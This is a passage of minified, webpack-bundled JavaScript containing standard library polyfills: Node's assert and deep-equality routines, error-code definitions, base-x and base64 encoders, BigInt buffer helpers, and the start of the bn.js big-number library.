                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }

                function o(e, t) {
                    return !t || "object" !== h(t) && "function" !== typeof t ? s(e) : t
                }

                function s(e) {
                    if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                    return e
                }

                function a(e) {
                    var t = "function" === typeof Map ? new Map : void 0;
                    return a = function(e) {
                        if (null === e || (n = e, -1 === Function.toString.call(n).indexOf("[native code]"))) return e;
                        var n;
                        if ("function" !== typeof e) throw new TypeError("Super expression must either be null or a function");
                        if ("undefined" !== typeof t) {
                            if (t.has(e)) return t.get(e);
                            t.set(e, r)
                        }

                        function r() {
                            return c(e, arguments, f(this).constructor)
                        }
                        return r.prototype = Object.create(e.prototype, {
                            constructor: {
                                value: r,
                                enumerable: !1,
                                writable: !0,
                                configurable: !0
                            }
                        }), l(r, e)
                    }, a(e)
                }

                function u() {
                    if ("undefined" === typeof Reflect || !Reflect.construct) return !1;
                    if (Reflect.construct.sham) return !1;
                    if ("function" === typeof Proxy) return !0;
                    try {
                        return Date.prototype.toString.call(Reflect.construct(Date, [], (function() {}))), !0
                    } catch (e) {
                        return !1
                    }
                }

                function c(e, t, n) {
                    return c = u() ? Reflect.construct : function(e, t, n) {
                        var r = [null];
                        r.push.apply(r, t);
                        var i = new(Function.bind.apply(e, r));
                        return n && l(i, n.prototype), i
                    }, c.apply(null, arguments)
                }

                function l(e, t) {
                    return l = Object.setPrototypeOf || function(e, t) {
                        return e.__proto__ = t, e
                    }, l(e, t)
                }

                function f(e) {
                    return f = Object.setPrototypeOf ? Object.getPrototypeOf : function(e) {
                        return e.__proto__ || Object.getPrototypeOf(e)
                    }, f(e)
                }

                function h(e) {
                    return h = "function" === typeof Symbol && "symbol" === typeof Symbol.iterator ? function(e) {
                        return typeof e
                    } : function(e) {
                        return e && "function" === typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                    }, h(e)
                }
                var d = n(9639).inspect,
                    p = n(3372).codes.ERR_INVALID_ARG_TYPE;

                function y(e, t, n) {
                    return (void 0 === n || n > e.length) && (n = e.length), e.substring(n - t.length, n) === t
                }
                var g = "",
                    m = "",
                    w = "",
                    b = "",
                    v = {
                        deepStrictEqual: "Expected values to be strictly deep-equal:",
                        strictEqual: "Expected values to be strictly equal:",
                        strictEqualObject: 'Expected "actual" to be reference-equal to "expected":',
                        deepEqual: "Expected values to be loosely deep-equal:",
                        equal: "Expected values to be loosely equal:",
                        notDeepStrictEqual: 'Expected "actual" not to be strictly deep-equal to:',
                        notStrictEqual: 'Expected "actual" to be strictly unequal to:',
                        notStrictEqualObject: 'Expected "actual" not to be reference-equal to "expected":',
                        notDeepEqual: 'Expected "actual" not to be loosely deep-equal to:',
                        notEqual: 'Expected "actual" to be loosely unequal to:',
                        notIdentical: "Values identical but not reference-equal:"
                    };

                function A(e) {
                    var t = Object.keys(e),
                        n = Object.create(Object.getPrototypeOf(e));
                    return t.forEach((function(t) {
                        n[t] = e[t]
                    })), Object.defineProperty(n, "message", {
                        value: e.message
                    }), n
                }

                function k(e) {
                    return d(e, {
                        compact: !1,
                        customInspect: !1,
                        depth: 1e3,
                        maxArrayLength: 1 / 0,
                        showHidden: !1,
                        breakLength: 1 / 0,
                        showProxy: !1,
                        sorted: !0,
                        getters: !0
                    })
                }

                function _(e, t, n) {
                    var r = "",
                        i = "",
                        o = 0,
                        s = "",
                        a = !1,
                        u = k(e),
                        c = u.split("\n"),
                        l = k(t).split("\n"),
                        f = 0,
                        d = "";
                    if ("strictEqual" === n && "object" === h(e) && "object" === h(t) && null !== e && null !== t && (n = "strictEqualObject"), 1 === c.length && 1 === l.length && c[0] !== l[0]) {
                        var p = c[0].length + l[0].length;
                        if (p <= 10) {
                            if (("object" !== h(e) || null === e) && ("object" !== h(t) || null === t) && (0 !== e || 0 !== t)) return "".concat(v[n], "\n\n") + "".concat(c[0], " !== ").concat(l[0], "\n")
                        } else if ("strictEqualObject" !== n) {
                            if (p < (process.stderr && process.stderr.isTTY ? process.stderr.columns : 80)) {
                                for (; c[0][f] === l[0][f];) f++;
                                f > 2 && (d = "\n  ".concat(function(e, t) {
                                    if (t = Math.floor(t), 0 == e.length || 0 == t) return "";
                                    var n = e.length * t;
                                    for (t = Math.floor(Math.log(t) / Math.log(2)); t;) e += e, t--;
                                    return e + e.substring(0, n - e.length)
                                }(" ", f), "^"), f = 0)
                            }
                        }
                    }
                    for (var A = c[c.length - 1], _ = l[l.length - 1]; A === _ && (f++ < 2 ? s = "\n  ".concat(A).concat(s) : r = A, c.pop(), l.pop(), 0 !== c.length && 0 !== l.length);) A = c[c.length - 1], _ = l[l.length - 1];
                    var E = Math.max(c.length, l.length);
                    if (0 === E) {
                        var S = u.split("\n");
                        if (S.length > 30)
                            for (S[26] = "".concat(g, "...").concat(b); S.length > 27;) S.pop();
                        return "".concat(v.notIdentical, "\n\n").concat(S.join("\n"), "\n")
                    }
                    f > 3 && (s = "\n".concat(g, "...").concat(b).concat(s), a = !0), "" !== r && (s = "\n  ".concat(r).concat(s), r = "");
                    var I = 0,
                        x = v[n] + "\n".concat(m, "+ actual").concat(b, " ").concat(w, "- expected").concat(b),
                        M = " ".concat(g, "...").concat(b, " Lines skipped");
                    for (f = 0; f < E; f++) {
                        var B = f - o;
                        if (c.length < f + 1) B > 1 && f > 2 && (B > 4 ? (i += "\n".concat(g, "...").concat(b), a = !0) : B > 3 && (i += "\n  ".concat(l[f - 2]), I++), i += "\n  ".concat(l[f - 1]), I++), o = f, r += "\n".concat(w, "-").concat(b, " ").concat(l[f]), I++;
                        else if (l.length < f + 1) B > 1 && f > 2 && (B > 4 ? (i += "\n".concat(g, "...").concat(b), a = !0) : B > 3 && (i += "\n  ".concat(c[f - 2]), I++), i += "\n  ".concat(c[f - 1]), I++), o = f, i += "\n".concat(m, "+").concat(b, " ").concat(c[f]), I++;
                        else {
                            var T = l[f],
                                O = c[f],
                                C = O !== T && (!y(O, ",") || O.slice(0, -1) !== T);
                            C && y(T, ",") && T.slice(0, -1) === O && (C = !1, O += ","), C ? (B > 1 && f > 2 && (B > 4 ? (i += "\n".concat(g, "...").concat(b), a = !0) : B > 3 && (i += "\n  ".concat(c[f - 2]), I++), i += "\n  ".concat(c[f - 1]), I++), o = f, i += "\n".concat(m, "+").concat(b, " ").concat(O), r += "\n".concat(w, "-").concat(b, " ").concat(T), I += 2) : (i += r, r = "", 1 !== B && 0 !== f || (i += "\n  ".concat(O), I++))
                        }
                        if (I > 20 && f < E - 2) return "".concat(x).concat(M, "\n").concat(i, "\n").concat(g, "...").concat(b).concat(r, "\n") + "".concat(g, "...").concat(b)
                    }
                    return "".concat(x).concat(a ? M : "", "\n").concat(i).concat(r).concat(s).concat(d)
                }
                var E = function(e) {
                    function t(e) {
                        var n;
                        if (function(e, t) {
                                if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
                            }(this, t), "object" !== h(e) || null === e) throw new p("options", "Object", e);
                        var r = e.message,
                            i = e.operator,
                            a = e.stackStartFn,
                            u = e.actual,
                            c = e.expected,
                            l = Error.stackTraceLimit;
                        if (Error.stackTraceLimit = 0, null != r) n = o(this, f(t).call(this, String(r)));
                        else if (process.stderr && process.stderr.isTTY && (process.stderr && process.stderr.getColorDepth && 1 !== process.stderr.getColorDepth() ? (g = "\x1b[34m", m = "\x1b[32m", b = "\x1b[39m", w = "\x1b[31m") : (g = "", m = "", b = "", w = "")), "object" === h(u) && null !== u && "object" === h(c) && null !== c && "stack" in u && u instanceof Error && "stack" in c && c instanceof Error && (u = A(u), c = A(c)), "deepStrictEqual" === i || "strictEqual" === i) n = o(this, f(t).call(this, _(u, c, i)));
                        else if ("notDeepStrictEqual" === i || "notStrictEqual" === i) {
                            var d = v[i],
                                y = k(u).split("\n");
                            if ("notStrictEqual" === i && "object" === h(u) && null !== u && (d = v.notStrictEqualObject), y.length > 30)
                                for (y[26] = "".concat(g, "...").concat(b); y.length > 27;) y.pop();
                            n = 1 === y.length ? o(this, f(t).call(this, "".concat(d, " ").concat(y[0]))) : o(this, f(t).call(this, "".concat(d, "\n\n").concat(y.join("\n"), "\n")))
                        } else {
                            var E = k(u),
                                S = "",
                                I = v[i];
                            "notDeepEqual" === i || "notEqual" === i ? (E = "".concat(v[i], "\n\n").concat(E)).length > 1024 && (E = "".concat(E.slice(0, 1021), "...")) : (S = "".concat(k(c)), E.length > 512 && (E = "".concat(E.slice(0, 509), "...")), S.length > 512 && (S = "".concat(S.slice(0, 509), "...")), "deepEqual" === i || "equal" === i ? E = "".concat(I, "\n\n").concat(E, "\n\nshould equal\n\n") : S = " ".concat(i, " ").concat(S)), n = o(this, f(t).call(this, "".concat(E).concat(S)))
                        }
                        return Error.stackTraceLimit = l, n.generatedMessage = !r, Object.defineProperty(s(n), "name", {
                            value: "AssertionError [ERR_ASSERTION]",
                            enumerable: !1,
                            writable: !0,
                            configurable: !0
                        }), n.code = "ERR_ASSERTION", n.actual = u, n.expected = c, n.operator = i, Error.captureStackTrace && Error.captureStackTrace(s(n), a), n.stack, n.name = "AssertionError", o(n)
                    }
                    var n, a, u;
                    return function(e, t) {
                        if ("function" !== typeof t && null !== t) throw new TypeError("Super expression must either be null or a function");
                        e.prototype = Object.create(t && t.prototype, {
                            constructor: {
                                value: e,
                                writable: !0,
                                configurable: !0
                            }
                        }), t && l(e, t)
                    }(t, e), n = t, a = [{
                        key: "toString",
                        value: function() {
                            return "".concat(this.name, " [").concat(this.code, "]: ").concat(this.message)
                        }
                    }, {
                        key: d.custom,
                        value: function(e, t) {
                            return d(this, function(e) {
                                for (var t = 1; t < arguments.length; t++) {
                                    var n = null != arguments[t] ? arguments[t] : {},
                                        i = Object.keys(n);
                                    "function" === typeof Object.getOwnPropertySymbols && (i = i.concat(Object.getOwnPropertySymbols(n).filter((function(e) {
                                        return Object.getOwnPropertyDescriptor(n, e).enumerable
                                    })))), i.forEach((function(t) {
                                        r(e, t, n[t])
                                    }))
                                }
                                return e
                            }({}, t, {
                                customInspect: !1,
                                depth: 0
                            }))
                        }
                    }], a && i(n.prototype, a), u && i(n, u), t
                }(a(Error));
                e.exports = E
            },
            3372: (e, t, n) => {
                "use strict";

                function r(e) {
                    return r = "function" === typeof Symbol && "symbol" === typeof Symbol.iterator ? function(e) {
                        return typeof e
                    } : function(e) {
                        return e && "function" === typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                    }, r(e)
                }

                function i(e, t) {
                    return !t || "object" !== r(t) && "function" !== typeof t ? function(e) {
                        if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                        return e
                    }(e) : t
                }

                function o(e) {
                    return o = Object.setPrototypeOf ? Object.getPrototypeOf : function(e) {
                        return e.__proto__ || Object.getPrototypeOf(e)
                    }, o(e)
                }

                function s(e, t) {
                    return s = Object.setPrototypeOf || function(e, t) {
                        return e.__proto__ = t, e
                    }, s(e, t)
                }
                var a, u, c = {};

                function l(e, t, n) {
                    n || (n = Error);
                    var r = function(n) {
                        function r(n, s, a) {
                            var u;
                            return function(e, t) {
                                if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
                            }(this, r), u = i(this, o(r).call(this, function(e, n, r) {
                                return "string" === typeof t ? t : t(e, n, r)
                            }(n, s, a))), u.code = e, u
                        }
                        return function(e, t) {
                            if ("function" !== typeof t && null !== t) throw new TypeError("Super expression must either be null or a function");
                            e.prototype = Object.create(t && t.prototype, {
                                constructor: {
                                    value: e,
                                    writable: !0,
                                    configurable: !0
                                }
                            }), t && s(e, t)
                        }(r, n), r
                    }(n);
                    c[e] = r
                }

                function f(e, t) {
                    if (Array.isArray(e)) {
                        var n = e.length;
                        return e = e.map((function(e) {
                            return String(e)
                        })), n > 2 ? "one of ".concat(t, " ").concat(e.slice(0, n - 1).join(", "), ", or ") + e[n - 1] : 2 === n ? "one of ".concat(t, " ").concat(e[0], " or ").concat(e[1]) : "of ".concat(t, " ").concat(e[0])
                    }
                    return "of ".concat(t, " ").concat(String(e))
                }
                l("ERR_AMBIGUOUS_ARGUMENT", 'The "%s" argument is ambiguous. %s', TypeError), l("ERR_INVALID_ARG_TYPE", (function(e, t, i) {
                    var o, s, u, c;
                    if (void 0 === a && (a = n(8093)), a("string" === typeof e, "'name' must be a string"), "string" === typeof t && (s = "not ", t.substr(!u || u < 0 ? 0 : +u, s.length) === s) ? (o = "must not be", t = t.replace(/^not /, "")) : o = "must be", function(e, t, n) {
                            return (void 0 === n || n > e.length) && (n = e.length), e.substring(n - t.length, n) === t
                        }(e, " argument")) c = "The ".concat(e, " ").concat(o, " ").concat(f(t, "type"));
                    else {
                        var l = function(e, t, n) {
                            return "number" !== typeof n && (n = 0), !(n + t.length > e.length) && -1 !== e.indexOf(t, n)
                        }(e, ".") ? "property" : "argument";
                        c = 'The "'.concat(e, '" ').concat(l, " ").concat(o, " ").concat(f(t, "type"))
                    }
                    return c += ". Received type ".concat(r(i))
                }), TypeError), l("ERR_INVALID_ARG_VALUE", (function(e, t) {
                    var r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "is invalid";
                    void 0 === u && (u = n(9639));
                    var i = u.inspect(t);
                    return i.length > 128 && (i = "".concat(i.slice(0, 128), "...")), "The argument '".concat(e, "' ").concat(r, ". Received ").concat(i)
                }), TypeError, RangeError), l("ERR_INVALID_RETURN_VALUE", (function(e, t, n) {
                    var i;
                    return i = n && n.constructor && n.constructor.name ? "instance of ".concat(n.constructor.name) : "type ".concat(r(n)), "Expected ".concat(e, ' to be returned from the "').concat(t, '"') + " function but got ".concat(i, ".")
                }), TypeError), l("ERR_MISSING_ARGS", (function() {
                    for (var e = arguments.length, t = new Array(e), r = 0; r < e; r++) t[r] = arguments[r];
                    void 0 === a && (a = n(8093)), a(t.length > 0, "At least one arg needs to be specified");
                    var i = "The ",
                        o = t.length;
                    switch (t = t.map((function(e) {
                        return '"'.concat(e, '"')
                    })), o) {
                        case 1:
                            i += "".concat(t[0], " argument");
                            break;
                        case 2:
                            i += "".concat(t[0], " and ").concat(t[1], " arguments");
                            break;
                        default:
                            i += t.slice(0, o - 1).join(", "), i += ", and ".concat(t[o - 1], " arguments")
                    }
                    return "".concat(i, " must be specified")
                }), TypeError), e.exports.codes = c
            },
            6912: (e, t, n) => {
                "use strict";

                function r(e, t) {
                    return function(e) {
                        if (Array.isArray(e)) return e
                    }(e) || function(e, t) {
                        var n = [],
                            r = !0,
                            i = !1,
                            o = void 0;
                        try {
                            for (var s, a = e[Symbol.iterator](); !(r = (s = a.next()).done) && (n.push(s.value), !t || n.length !== t); r = !0);
                        } catch (u) {
                            i = !0, o = u
                        } finally {
                            try {
                                r || null == a.return || a.return()
                            } finally {
                                if (i) throw o
                            }
                        }
                        return n
                    }(e, t) || function() {
                        throw new TypeError("Invalid attempt to destructure non-iterable instance")
                    }()
                }

                function i(e) {
                    return i = "function" === typeof Symbol && "symbol" === typeof Symbol.iterator ? function(e) {
                        return typeof e
                    } : function(e) {
                        return e && "function" === typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                    }, i(e)
                }
                var o = void 0 !== /a/g.flags,
                    s = function(e) {
                        var t = [];
                        return e.forEach((function(e) {
                            return t.push(e)
                        })), t
                    },
                    a = function(e) {
                        var t = [];
                        return e.forEach((function(e, n) {
                            return t.push([n, e])
                        })), t
                    },
                    u = Object.is ? Object.is : n(3454),
                    c = Object.getOwnPropertySymbols ? Object.getOwnPropertySymbols : function() {
                        return []
                    },
                    l = Number.isNaN ? Number.isNaN : n(6188);

                function f(e) {
                    return e.call.bind(e)
                }
                var h = f(Object.prototype.hasOwnProperty),
                    d = f(Object.prototype.propertyIsEnumerable),
                    p = f(Object.prototype.toString),
                    y = n(9639).types,
                    g = y.isAnyArrayBuffer,
                    m = y.isArrayBufferView,
                    w = y.isDate,
                    b = y.isMap,
                    v = y.isRegExp,
                    A = y.isSet,
                    k = y.isNativeError,
                    _ = y.isBoxedPrimitive,
                    E = y.isNumberObject,
                    S = y.isStringObject,
                    I = y.isBooleanObject,
                    x = y.isBigIntObject,
                    M = y.isSymbolObject,
                    B = y.isFloat32Array,
                    T = y.isFloat64Array;

                function O(e) {
                    if (0 === e.length || e.length > 10) return !0;
                    for (var t = 0; t < e.length; t++) {
                        var n = e.charCodeAt(t);
                        if (n < 48 || n > 57) return !0
                    }
                    return 10 === e.length && e >= Math.pow(2, 32)
                }

                function C(e) {
                    return Object.keys(e).filter(O).concat(c(e).filter(Object.prototype.propertyIsEnumerable.bind(e)))
                }

                function P(e, t) {
                    if (e === t) return 0;
                    for (var n = e.length, r = t.length, i = 0, o = Math.min(n, r); i < o; ++i)
                        if (e[i] !== t[i]) {
                            n = e[i], r = t[i];
                            break
                        }
                    return n < r ? -1 : r < n ? 1 : 0
                }

                function L(e, t, n, r) {
                    if (e === t) return 0 !== e || (!n || u(e, t));
                    if (n) {
                        if ("object" !== i(e)) return "number" === typeof e && l(e) && l(t);
                        if ("object" !== i(t) || null === e || null === t) return !1;
                        if (Object.getPrototypeOf(e) !== Object.getPrototypeOf(t)) return !1
                    } else {
                        if (null === e || "object" !== i(e)) return (null === t || "object" !== i(t)) && e == t;
                        if (null === t || "object" !== i(t)) return !1
                    }
                    var s, a, c, f, h = p(e);
                    if (h !== p(t)) return !1;
                    if (Array.isArray(e)) {
                        if (e.length !== t.length) return !1;
                        var d = C(e),
                            y = C(t);
                        return d.length === y.length && R(e, t, n, r, 1, d)
                    }
                    if ("[object Object]" === h && (!b(e) && b(t) || !A(e) && A(t))) return !1;
                    if (w(e)) {
                        if (!w(t) || Date.prototype.getTime.call(e) !== Date.prototype.getTime.call(t)) return !1
                    } else if (v(e)) {
                        if (!v(t) || (c = e, f = t, !(o ? c.source === f.source && c.flags === f.flags : RegExp.prototype.toString.call(c) === RegExp.prototype.toString.call(f)))) return !1
                    } else if (k(e) || e instanceof Error) {
                        if (e.message !== t.message || e.name !== t.name) return !1
                    } else {
                        if (m(e)) {
                            if (n || !B(e) && !T(e)) {
                                if (! function(e, t) {
                                        return e.byteLength === t.byteLength && 0 === P(new Uint8Array(e.buffer, e.byteOffset, e.byteLength), new Uint8Array(t.buffer, t.byteOffset, t.byteLength))
                                    }(e, t)) return !1
                            } else if (! function(e, t) {
                                    if (e.byteLength !== t.byteLength) return !1;
                                    for (var n = 0; n < e.byteLength; n++)
                                        if (e[n] !== t[n]) return !1;
                                    return !0
                                }(e, t)) return !1;
                            var O = C(e),
                                L = C(t);
                            return O.length === L.length && R(e, t, n, r, 0, O)
                        }
                        if (A(e)) return !(!A(t) || e.size !== t.size) && R(e, t, n, r, 2);
                        if (b(e)) return !(!b(t) || e.size !== t.size) && R(e, t, n, r, 3);
                        if (g(e)) {
                            if (a = t, (s = e).byteLength !== a.byteLength || 0 !== P(new Uint8Array(s), new Uint8Array(a))) return !1
                        } else if (_(e) && ! function(e, t) {
                                return E(e) ? E(t) && u(Number.prototype.valueOf.call(e), Number.prototype.valueOf.call(t)) : S(e) ? S(t) && String.prototype.valueOf.call(e) === String.prototype.valueOf.call(t) : I(e) ? I(t) && Boolean.prototype.valueOf.call(e) === Boolean.prototype.valueOf.call(t) : x(e) ? x(t) && BigInt.prototype.valueOf.call(e) === BigInt.prototype.valueOf.call(t) : M(t) && Symbol.prototype.valueOf.call(e) === Symbol.prototype.valueOf.call(t)
                            }(e, t)) return !1
                    }
                    return R(e, t, n, r, 0)
                }

                function N(e, t) {
                    return t.filter((function(t) {
                        return d(e, t)
                    }))
                }

                function R(e, t, n, r, i, o) {
                    if (5 === arguments.length) {
                        o = Object.keys(e);
                        var s = Object.keys(t);
                        if (o.length !== s.length) return !1
                    }
                    for (var a = 0; a < o.length; a++)
                        if (!h(t, o[a])) return !1;
                    if (n && 5 === arguments.length) {
                        var u = c(e);
                        if (0 !== u.length) {
                            var l = 0;
                            for (a = 0; a < u.length; a++) {
                                var f = u[a];
                                if (d(e, f)) {
                                    if (!d(t, f)) return !1;
                                    o.push(f), l++
                                } else if (d(t, f)) return !1
                            }
                            var p = c(t);
                            if (u.length !== p.length && N(t, p).length !== l) return !1
                        } else {
                            var y = c(t);
                            if (0 !== y.length && 0 !== N(t, y).length) return !1
                        }
                    }
                    if (0 === o.length && (0 === i || 1 === i && 0 === e.length || 0 === e.size)) return !0;
                    if (void 0 === r) r = {
                        val1: new Map,
                        val2: new Map,
                        position: 0
                    };
                    else {
                        var g = r.val1.get(e);
                        if (void 0 !== g) {
                            var m = r.val2.get(t);
                            if (void 0 !== m) return g === m
                        }
                        r.position++
                    }
                    r.val1.set(e, r.position), r.val2.set(t, r.position);
                    var w = H(e, t, n, o, r, i);
                    return r.val1.delete(e), r.val2.delete(t), w
                }

                function D(e, t, n, r) {
                    for (var i = s(e), o = 0; o < i.length; o++) {
                        var a = i[o];
                        if (L(t, a, n, r)) return e.delete(a), !0
                    }
                    return !1
                }

                function z(e) {
                    switch (i(e)) {
                        case "undefined":
                            return null;
                        case "object":
                            return;
                        case "symbol":
                            return !1;
                        case "string":
                            e = +e;
                        case "number":
                            if (l(e)) return !1
                    }
                    return !0
                }

                function U(e, t, n) {
                    var r = z(n);
                    return null != r ? r : t.has(r) && !e.has(r)
                }

                function j(e, t, n, r, i) {
                    var o = z(n);
                    if (null != o) return o;
                    var s = t.get(o);
                    return !(void 0 === s && !t.has(o) || !L(r, s, !1, i)) && (!e.has(o) && L(r, s, !1, i))
                }

                function F(e, t, n, r, i, o) {
                    for (var a = s(e), u = 0; u < a.length; u++) {
                        var c = a[u];
                        if (L(n, c, i, o) && L(r, t.get(c), i, o)) return e.delete(c), !0
                    }
                    return !1
                }

                function H(e, t, n, o, u, c) {
                    var l = 0;
                    if (2 === c) {
                        if (! function(e, t, n, r) {
                                for (var o = null, a = s(e), u = 0; u < a.length; u++) {
                                    var c = a[u];
                                    if ("object" === i(c) && null !== c) null === o && (o = new Set), o.add(c);
                                    else if (!t.has(c)) {
                                        if (n) return !1;
                                        if (!U(e, t, c)) return !1;
                                        null === o && (o = new Set), o.add(c)
                                    }
                                }
                                if (null !== o) {
                                    for (var l = s(t), f = 0; f < l.length; f++) {
                                        var h = l[f];
                                        if ("object" === i(h) && null !== h) {
                                            if (!D(o, h, n, r)) return !1
                                        } else if (!n && !e.has(h) && !D(o, h, n, r)) return !1
                                    }
                                    return 0 === o.size
                                }
                                return !0
                            }(e, t, n, u)) return !1
                    } else if (3 === c) {
                        if (! function(e, t, n, o) {
                                for (var s = null, u = a(e), c = 0; c < u.length; c++) {
                                    var l = r(u[c], 2),
                                        f = l[0],
                                        h = l[1];
                                    if ("object" === i(f) && null !== f) null === s && (s = new Set), s.add(f);
                                    else {
                                        var d = t.get(f);
                                        if (void 0 === d && !t.has(f) || !L(h, d, n, o)) {
                                            if (n) return !1;
                                            if (!j(e, t, f, h, o)) return !1;
                                            null === s && (s = new Set), s.add(f)
                                        }
                                    }
                                }
                                if (null !== s) {
                                    for (var p = a(t), y = 0; y < p.length; y++) {
                                        var g = r(p[y], 2),
                                            m = (f = g[0], g[1]);
                                        if ("object" === i(f) && null !== f) {
                                            if (!F(s, e, f, m, n, o)) return !1
                                        } else if (!n && (!e.has(f) || !L(e.get(f), m, !1, o)) && !F(s, e, f, m, !1, o)) return !1
                                    }
                                    return 0 === s.size
                                }
                                return !0
                            }(e, t, n, u)) return !1
                    } else if (1 === c)
                        for (; l < e.length; l++) {
                            if (!h(e, l)) {
                                if (h(t, l)) return !1;
                                for (var f = Object.keys(e); l < f.length; l++) {
                                    var d = f[l];
                                    if (!h(t, d) || !L(e[d], t[d], n, u)) return !1
                                }
                                return f.length === Object.keys(t).length
                            }
                            if (!h(t, l) || !L(e[l], t[l], n, u)) return !1
                        }
                    for (l = 0; l < o.length; l++) {
                        var p = o[l];
                        if (!L(e[p], t[p], n, u)) return !1
                    }
                    return !0
                }
                e.exports = {
                    isDeepEqual: function(e, t) {
                        return L(e, t, false)
                    },
                    isDeepStrictEqual: function(e, t) {
                        return L(e, t, true)
                    }
                }
            },
            2307: (e, t, n) => {
                "use strict";
                var r = n(2543).Buffer;
                e.exports = function(e) {
                    if (e.length >= 255) throw new TypeError("Alphabet too long");
                    for (var t = new Uint8Array(256), n = 0; n < t.length; n++) t[n] = 255;
                    for (var i = 0; i < e.length; i++) {
                        var o = e.charAt(i),
                            s = o.charCodeAt(0);
                        if (255 !== t[s]) throw new TypeError(o + " is ambiguous");
                        t[s] = i
                    }
                    var a = e.length,
                        u = e.charAt(0),
                        c = Math.log(a) / Math.log(256),
                        l = Math.log(256) / Math.log(a);

                    function f(e) {
                        if ("string" !== typeof e) throw new TypeError("Expected String");
                        if (0 === e.length) return r.alloc(0);
                        for (var n = 0, i = 0, o = 0; e[n] === u;) i++, n++;
                        for (var s = (e.length - n) * c + 1 >>> 0, l = new Uint8Array(s); e[n];) {
                            var f = t[e.charCodeAt(n)];
                            if (255 === f) return;
                            for (var h = 0, d = s - 1;
                                (0 !== f || h < o) && -1 !== d; d--, h++) f += a * l[d] >>> 0, l[d] = f % 256 >>> 0, f = f / 256 >>> 0;
                            if (0 !== f) throw new Error("Non-zero carry");
                            o = h, n++
                        }
                        for (var p = s - o; p !== s && 0 === l[p];) p++;
                        var y = r.allocUnsafe(i + (s - p));
                        y.fill(0, 0, i);
                        for (var g = i; p !== s;) y[g++] = l[p++];
                        return y
                    }
                    return {
                        encode: function(t) {
                            if ((Array.isArray(t) || t instanceof Uint8Array) && (t = r.from(t)), !r.isBuffer(t)) throw new TypeError("Expected Buffer");
                            if (0 === t.length) return "";
                            for (var n = 0, i = 0, o = 0, s = t.length; o !== s && 0 === t[o];) o++, n++;
                            for (var c = (s - o) * l + 1 >>> 0, f = new Uint8Array(c); o !== s;) {
                                for (var h = t[o], d = 0, p = c - 1;
                                    (0 !== h || d < i) && -1 !== p; p--, d++) h += 256 * f[p] >>> 0, f[p] = h % a >>> 0, h = h / a >>> 0;
                                if (0 !== h) throw new Error("Non-zero carry");
                                i = d, o++
                            }
                            for (var y = c - i; y !== c && 0 === f[y];) y++;
                            for (var g = u.repeat(n); y < c; ++y) g += e.charAt(f[y]);
                            return g
                        },
                        decodeUnsafe: f,
                        decode: function(e) {
                            var t = f(e);
                            if (t) return t;
                            throw new Error("Non-base" + a + " character")
                        }
                    }
                }
            },
            2009: (e, t) => {
                "use strict";
                t.byteLength = function(e) {
                    var t = u(e),
                        n = t[0],
                        r = t[1];
                    return 3 * (n + r) / 4 - r
                }, t.toByteArray = function(e) {
                    var t, n, o = u(e),
                        s = o[0],
                        a = o[1],
                        c = new i(function(e, t, n) {
                            return 3 * (t + n) / 4 - n
                        }(0, s, a)),
                        l = 0,
                        f = a > 0 ? s - 4 : s;
                    for (n = 0; n < f; n += 4) t = r[e.charCodeAt(n)] << 18 | r[e.charCodeAt(n + 1)] << 12 | r[e.charCodeAt(n + 2)] << 6 | r[e.charCodeAt(n + 3)], c[l++] = t >> 16 & 255, c[l++] = t >> 8 & 255, c[l++] = 255 & t;
                    2 === a && (t = r[e.charCodeAt(n)] << 2 | r[e.charCodeAt(n + 1)] >> 4, c[l++] = 255 & t);
                    1 === a && (t = r[e.charCodeAt(n)] << 10 | r[e.charCodeAt(n + 1)] << 4 | r[e.charCodeAt(n + 2)] >> 2, c[l++] = t >> 8 & 255, c[l++] = 255 & t);
                    return c
                }, t.fromByteArray = function(e) {
                    for (var t, r = e.length, i = r % 3, o = [], s = 16383, a = 0, u = r - i; a < u; a += s) o.push(c(e, a, a + s > u ? u : a + s));
                    1 === i ? (t = e[r - 1], o.push(n[t >> 2] + n[t << 4 & 63] + "==")) : 2 === i && (t = (e[r - 2] << 8) + e[r - 1], o.push(n[t >> 10] + n[t >> 4 & 63] + n[t << 2 & 63] + "="));
                    return o.join("")
                };
                for (var n = [], r = [], i = "undefined" !== typeof Uint8Array ? Uint8Array : Array, o = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", s = 0, a = o.length; s < a; ++s) n[s] = o[s], r[o.charCodeAt(s)] = s;

                function u(e) {
                    var t = e.length;
                    if (t % 4 > 0) throw new Error("Invalid string. Length must be a multiple of 4");
                    var n = e.indexOf("=");
                    return -1 === n && (n = t), [n, n === t ? 0 : 4 - n % 4]
                }

                function c(e, t, r) {
                    for (var i, o, s = [], a = t; a < r; a += 3) i = (e[a] << 16 & 16711680) + (e[a + 1] << 8 & 65280) + (255 & e[a + 2]), s.push(n[(o = i) >> 18 & 63] + n[o >> 12 & 63] + n[o >> 6 & 63] + n[63 & o]);
                    return s.join("")
                }
                r["-".charCodeAt(0)] = 62, r["_".charCodeAt(0)] = 63
            },
            6070: (e, t) => {
                "use strict";
                t.oU = function(e) {
                    {
                        const t = Buffer.from(e);
                        t.reverse();
                        const n = t.toString("hex");
                        return 0 === n.length ? BigInt(0) : BigInt(`0x${n}`)
                    }
                }, t.k$ = function(e, t) {
                    {
                        const n = e.toString(16),
                            r = Buffer.from(n.padStart(2 * t, "0").slice(0, 2 * t), "hex");
                        return r.reverse(), r
                    }
                }
            },
            518: function(e, t, n) {
                ! function(e, t) {
                    "use strict";

                    function r(e, t) {
                        if (!e) throw new Error(t || "Assertion failed")
                    }

                    function i(e, t) {
                        e.super_ = t;
                        var n = function() {};
                        n.prototype = t.prototype, e.prototype = new n, e.prototype.constructor = e
                    }

                    function o(e, t, n) {
                        if (o.isBN(e)) return e;
                        this.negative = 0, this.words = null, this.length = 0, this.red = null, null !== e && ("le" !== t && "be" !== t || (n = t, t = 10), this._init(e || 0, t || 10, n || "be"))
                    }
                    var s;
